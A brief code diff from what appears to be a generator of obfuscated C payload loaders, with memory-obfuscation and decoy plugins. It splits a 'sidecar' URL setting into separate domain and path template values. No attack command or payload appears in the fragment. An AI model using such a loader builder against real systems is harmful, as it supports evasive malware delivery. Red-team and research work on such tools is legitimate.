@@ -131,11 +131,13 @@ def create_c_from_template(settings: Settings, payload_len: int):
         settings.plugin_memoryobfuscation)
     with open(filepath_memoryobfuscation, "r", encoding='utf-8') as file:
          process_spawn = settings.process_spawn
-         url_sidecar = settings.url_sidecar
+         sidecar_domain = settings.sidecar_domain
+         sidecar_path = settings.sidecar_path
          plugin_memoryobfuscation = file.read()
          plugin_memoryobfuscation = Template(plugin_memoryobfuscation).render({
              'PROCESS_SPAWN': process_spawn,
-             'URL_SIDECAR': url_sidecar,
+             'SIDECAR_DOMAIN': sidecar_domain,
+             'SIDECAR_PATH': sidecar_path,
          })
 
     # Plugin: Decoy
